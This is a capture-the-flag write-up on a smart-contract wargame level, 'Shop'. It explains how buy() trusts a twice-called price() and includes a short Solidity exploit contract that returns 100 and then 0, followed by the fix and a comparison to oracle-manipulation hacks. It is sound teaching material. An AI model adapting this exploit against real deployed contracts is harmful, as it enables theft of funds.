# Level 21: Shop

**Target:** [Shop.sol](./Shop.sol)
**Exploit:** [exploit.sol](./exploit.sol)

## Vulnerability

The `buy()` function calls `Buyer(msg.sender).price()` twice: first to check whether the price meets the threshold (≥ 100), then again to set the actual purchase price. A malicious buyer can return different values on each call — bypassing the check while paying a lower price.

## Key Concepts

**Interface trust assumption:** The `Shop` contract casts `msg.sender` to a `Buyer` interface and assumes the returned `price()` value will be consistent across calls. It has no way to enforce this — the caller controls the implementation.

**`view` restriction:** The `price()` function is declared `view` in the `Buyer` interface. This prevents writing to storage inside `price()`, but does not prevent reading external contract state. The `isSold` flag on the Shop contract is readable mid-execution.

**State change between calls:** The Shop contract sets `isSold = true` before the second `price()` call. This state change is observable by the attacker.

```solidity
// Shop.buy():
if (_buyer.price() >= price && !isSold) {  // first call: must return >= 100
    isSold = true;
    price = _buyer.price();                 // second call: isSold is now true
}
```

## Exploit

```solidity
contract Exploit {
    address target = 0x...;

    function price() external view returns (uint256) {
        // First call: isSold == false → return 100 (passes the check)
        // Second call: isSold == true → return 0 (pays nothing)
        return IExploit(target).isSold() == false ? 100 : 0;
    }

    function buy() external {
        IExploit(target).buy();
    }
}
```

## Root Cause

Calling an untrusted external function twice and using the results for both validation and state assignment. Any time the same external call is used for both a check and a consequent value, the callee can return different values. The fix is to cache the result of the first call:

```solidity
uint256 currentPrice = _buyer.price();
if (currentPrice >= price && !isSold) {
    isSold = true;
    price = currentPrice; // use cached value, not a second call
}
```

## Real-World Reference

Oracle manipulation attacks follow the same pattern at a larger scale. Protocols that call a price oracle multiple times in the same transaction (once to check a condition, again to compute a value) are vulnerable to flash-loan-driven price manipulation between those calls. The **Cream Finance hack (2021, $130M)** involved a price oracle that was read twice in the same transaction, with the attacker manipulating the price between reads using a flash loan.
